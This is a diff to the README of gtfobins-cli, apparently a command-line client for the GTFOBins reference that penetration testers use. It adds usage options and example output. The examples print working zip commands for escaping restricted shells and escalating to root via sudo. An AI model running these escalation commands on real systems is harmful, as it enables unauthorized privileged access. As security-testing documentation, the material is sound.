@@ -14,17 +14,17 @@ $ chmod +x gtfobins-cli.py
 
 Now, you can use either `python3 gtfobins-cli.py` or `./gtfobins-cli.py` to execute the tool.
 
-Additionally, you can rename the script to simply `gtfobins-cli` and move it to a directory in your `PATH` environment variable (i.e `/usr/local/bin`), so that `gtfobins-cli` is available as a command at every working directory.
+Additionally, you can rename the script to simply `gtfobins-cli` and move it to a directory in your `PATH` environment variable (i.e `/usr/local/bin`), so that `gtfobins-cli` is available as a command at every working directory. Alternatively, you can create a symbolic link inside a directory in the `PATH` to the actual script. 
 
 ## Usage of `gtfobins-cli`
 
 As easy as using https://gtfobins.github.io:
 
 ```console
-$ gtfobins-cli <command>
+$ gtfobins-cli [options] <command>
 ```
 
-For example:
+For example, you can read all information about a command:
 
 ```console
 $ gtfobins-cli.py zip              
@@ -71,12 +71,52 @@ TF=$(mktemp -u)
 sudo rm $TF 
 ```
 
+Or you can try to be more specific:
+
+```console
+$ gtfobins-cli --shell zip
+
+zip ==> https://gtfobins.github.io/gtfobins/zip/
+
+
+Shell
+
+It can be used to break out from restricted environments by spawning an interactive system shell.
+
+TF=$(mktemp -u)
+zip $TF /etc/hosts -T -TT 'sh #'
+rm $TF
+```
+
+```console
+$ gtfobins-cli --shell --sudo zip
+
+zip ==> https://gtfobins.github.io/gtfobins/zip/
+
+
+Shell
+
+It can be used to break out from restricted environments by spawning an interactive system shell.
+
+TF=$(mktemp -u)
+zip $TF /etc/hosts -T -TT 'sh #'
+rm $TF
+
+
+Sudo
+
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+sudo rm $TF
+
 ## Using `gtfobins-cli` with Docker
 
 There is an image in Docker Hub called `7rocky/gtfobins-cli` to execute `gtfobins-cli` from a Docker container:
 
 ```console
-$ docker run --rm -it 7rocky/gtfobins-cli <command>
+$ docker run --rm -it 7rocky/gtfobins-cli [options] <command>
 ```
 
 If you want to build and run the image locally:
@@ -84,7 +124,7 @@ If you want to build and run the image locally:
 ```console
 $ cd gtfobins-cli/
 $ docker build -t gtfobins-cli .
-$ docker run --rm -it gtfobins-cli <command>
+$ docker run --rm -it gtfobins-cli [options] <command>
 ```
 
 Hope it is useful! :smile:
